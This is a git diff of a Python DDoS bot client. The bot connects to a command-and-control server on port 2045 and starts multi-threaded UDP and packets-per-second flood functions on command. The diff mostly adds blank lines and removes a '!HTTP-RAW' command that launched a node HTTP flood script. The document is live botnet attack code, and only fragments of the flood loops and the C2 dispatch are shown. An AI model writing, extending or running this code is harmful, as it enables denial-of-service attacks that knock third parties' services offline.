@@ -11,6 +11,9 @@ C2_PORT     = 2045
 #raw attacks
 
 
+
+
+
 def attack_udp(ip, port, end_time, size):
     while time.time() < end_time:
         try:
@@ -88,6 +91,8 @@ def attack_pps(ip, port, end_time, size):
             continue
         finally:
             s.close()
+
+
 
 #bypass attacks
 
@@ -248,13 +253,7 @@ def main():
                     threads = 20
                     for _ in range(threads):
                         threading.Thread(target=attack_pps, args=(ip, port, end_time, size), daemon=True).start()
-                if command == '!HTTP-RAW':
-                    url = args[1]
-                    duration = int(args[2])
-                    size = 65500
-                    threads = 1
-                    for _ in range(threads):
-                        os.system(f'node new/HTTP-RAW.js {url} {duration}')
+
                         
                 elif command == 'PING':
                     c2.send('PONG'.encode())
